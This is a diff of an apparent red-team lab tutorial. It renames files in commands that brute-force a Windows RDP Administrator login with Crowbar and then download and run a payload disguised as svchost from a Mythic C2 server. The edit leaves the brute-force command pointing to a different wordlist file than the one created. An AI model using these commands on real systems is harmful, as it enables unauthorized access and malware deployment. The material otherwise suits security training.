@@ -48,11 +48,11 @@ Before jumping into the action, let’s set up our environment. I’m using **Vu
     ```
 2. Use the first 50 lines of the `rockyou.txt` wordlist to create a smaller list:
     ```bash
-    head -50 rockyou.txt > /home/kali/phoenix-wordlist.txt
+    head -50 rockyou.txt > /home/kali/aurora-wordlist.txt
     ```
 3. Edit the wordlist and insert the real password for proof of concept:
     ```bash
-    nano /home/kali/phoenix-wordlist.txt
+    nano /home/kali/aurora-wordlist.txt
     ```
 
 #### Step 3: Brute Force the Windows RDP Login
@@ -63,7 +63,7 @@ Before jumping into the action, let’s set up our environment. I’m using **Vu
     ```
 2. Run Crowbar to brute force the RDP login:
     ```bash
-    crowbar -b rdp -u Administrator -C /home/kali/phoenix-wordlist.txt -s [Windows-Server-IP]/32
+    crowbar -b rdp -u Administrator -C /home/kali/brute.txt -s [Windows-Server-IP]/32
     ```
 
 ### Phase 2: Discovery — Gathering Information on the Compromised Server
@@ -127,12 +127,12 @@ Before jumping into the action, let’s set up our environment. I’m using **Vu
 
 1. Download the payload using PowerShell:
     ```powershell
-    Invoke-WebRequest -Uri http://[Mythic-Server-IP]:9999/svchost-phoenixrocks.exe -Outfile "C:\Users\Public\downloads\svchost-phoenixrocks.exe"
+    Invoke-WebRequest -Uri http://[Mythic-Server-IP]:9999/svchost-aurorarocks.exe -Outfile "C:\Users\Public\downloads\svchost-aurorarocks.exe"
     ```
 
 2. Execute the payload:
     ```powershell
-    .\svchost-phoenixrocks.exe
+    .\svchost-aurorarocks.exe
     ```
 
 ### Phase 5: Command & Control — Establishing a C2 Session
